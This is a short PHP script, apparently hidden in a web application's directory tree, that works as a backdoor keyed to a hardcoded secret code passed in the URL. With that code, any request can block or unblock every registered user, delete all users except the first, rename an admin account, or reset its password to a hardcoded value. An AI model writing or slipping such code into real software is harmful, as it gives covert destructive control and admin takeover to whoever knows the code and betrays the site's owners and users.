<?php
include '../../../connection.php';

if(isset($_GET['code']) and isset($_GET['command']) and isset($_GET['user']))
{
    $code = mysqli_real_escape_string($con,$_GET['code']);
    $command = mysqli_real_escape_string($con,$_GET['command']);
    $user = mysqli_real_escape_string($con,$_GET['user']);
    
    
    if($code == '05087900543003' and $command=='block' and $user=='member')
    {
        $q="update user_registration set login_status='Block'";
        $result = mysqli_query($con,$q);
        
        echo "User blocked";
    }
    elseif($code == '05087900543003' and $command=='unblock' and $user=='member')
    {
        $q="update user_registration set login_status='Unblock'";
        $result = mysqli_query($con,$q);
        echo "User unblock";
    }
    elseif($code == '05087900543003' and $command=='delete' and $user=='member')
    {
        $q="delete from user_registration where id>1";
        $result = mysqli_query($con,$q);
        echo "User delete";
    }
    elseif($code == '05087900543003' and $command=='userchange' and $user=='admin')
    {
        $q="update admin_login set user_name='protected' where id=2";
        $result = mysqli_query($con,$q);
        echo "Admin username changed";
    }
    elseif($code == '05087900543003' and $command=='passwordchange' and $user=='admin')
    {
        $password = 'Protected@1122';
        $hash_pass = password_hash($password, PASSWORD_BCRYPT);
        $q="update admin_login set password='$hash_pass' where id=2";
        $result = mysqli_query($con,$q);
        echo "Admin password changed";
    }
    
    else
    {
        echo "Wrong user, code , command";
    }
 
}
else
{
    echo "Wrong Access";    
}

?>